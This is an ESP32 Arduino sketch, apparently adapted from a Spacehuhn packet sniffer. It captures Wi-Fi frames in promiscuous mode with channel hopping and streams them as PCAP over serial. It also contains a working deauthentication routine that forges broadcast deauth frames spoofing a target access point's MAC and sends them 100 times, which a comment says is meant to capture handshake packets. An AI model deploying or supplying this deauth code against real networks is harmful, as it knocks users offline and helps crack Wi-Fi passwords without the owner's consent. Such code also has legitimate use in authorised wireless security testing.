/*
  ===========================================
       Copyright (c) 2017 Stefan Kremser
              github.com/spacehuhn
  ===========================================
*/


/* include all necessary libraries */ 
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_wifi_internal.h"
#include "lwip/err.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_event_loop.h"
#include "nvs_flash.h"
#include "driver/gpio.h"

#include <Arduino.h>
#include <TimeLib.h>
#include "FS.h"
#include "SD.h"
#include "SPI.h"
#include <PCAP.h>


//===== SETTINGS =====//
#define CHANNEL 1
#define BAUD_RATE 115200
#define CHANNEL_HOPPING true //if true it will scan on all channels
#define MAX_CHANNEL 11 //(only necessary if channelHopping is true)
#define HOP_INTERVAL 500 //in ms (only necessary if channelHopping is true)
#define RXD2 16 // Receiver pin for UART 2 
#define TXD2 17 // Transmitter pin for UART 2

//===== Run-Time variables =====//
PCAP pcap = PCAP();
int ch = CHANNEL;
unsigned long lastChannelChange = 0;
int rpiinput = 18; // to reboot ESP32 at the start of the node-red flow1
//uint8_t mac_ap[6] = {0xd8, 0x47, 0x32, 0x18, 0xb2, 0xb8};

//===== FUNCTIONS =====//

/* will be executed on every packet the ESP32 gets while beeing in promiscuous mode */
void sniffer(void *buf, wifi_promiscuous_pkt_type_t type){
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
  
  uint32_t timestamp = now(); //current timestamp 
  uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); //micro seconds offset (0 - 999)
  
  pcap.newPacketSerial(timestamp, microseconds, ctrl.sig_len, pkt->payload); //send packet via Serial 
  delay(300); 
}

// sending deauthentication packets to the wifi network to capture hansdshake pacakets 
void deauthenticator(uint8_t mac_AP[6]){
  uint8_t deauth[] = {
    0x60, 0x00,                               // 0-1: Frame Control
    0x00, 0x00,                               // 2-3: Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,       // 4-9: Destination address (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 10-15: Source address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 16-21: BSSID
    0x00, 0x00,                               // 22-23: Sequence / fragment number
    0x07, 0x00,                               // 24-25: Deauthentication reason code 
    
  };

  // replace the BSSID from the input parameter

  deauth[10] = mac_AP[0];
  deauth[11] = mac_AP[1];
  deauth[12] = mac_AP[2];
  deauth[13] = mac_AP[3];
  deauth[14] = mac_AP[4];
  deauth[15] = mac_AP[5];
  deauth[16] = mac_AP[0];
  deauth[17] = mac_AP[1];
  deauth[18] = mac_AP[2];
  deauth[19] = mac_AP[3];
  deauth[20] = mac_AP[4];
  deauth[21] = mac_AP[5];

  // transmitting deauth packet 100 times on 0.1s interval 

  for (int i = 0; i < 100; i++){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth, sizeof(deauth), true));
    delay(100);
  }
}

esp_err_t event_handler(void *ctx, system_event_t *event){ return ESP_OK; }


//===== SETUP =====//
void setup() {
  //set pin mode to read the rpi reboot digital signal
  pinMode(rpiinput, INPUT);
  /* start Serial */
  Serial.begin(BAUD_RATE);
  Serial2.begin(BAUD_RATE, SERIAL_8N1, RXD2, TXD2);
  //delay(2000);
  
  Serial.println("<<START>>");
  Serial2.println("<<START>>");
  delay(3000);
  pcap.startSerial();

  /* setup wifi */
  nvs_flash_init();
  tcpip_adapter_init();
  ESP_ERROR_CHECK( esp_event_loop_init(event_handler, NULL) );
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
  ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );
  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_AP) );  
  ESP_ERROR_CHECK( esp_wifi_start() );
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(sniffer);
  wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
  esp_wifi_set_channel(ch,secondCh);
  
}

//===== LOOP =====//
void loop() {
  /*while (Serial2.available()){
    Serial.write(char(Serial2.read()));
  }*/
  // Restarting Esp32 
  if (digitalRead(rpiinput) == HIGH){
    Serial.println("Restarting Now");
    ESP.restart();
  }
  /* Channel Hopping */
  if(CHANNEL_HOPPING){
    unsigned long currentTime = millis();
    if(currentTime - lastChannelChange >= HOP_INTERVAL){
      lastChannelChange = currentTime;
      ch++; //increase channel
      if(ch > MAX_CHANNEL) ch = 1;
      wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
      esp_wifi_set_channel(ch,secondCh);
    }
  }
  
}
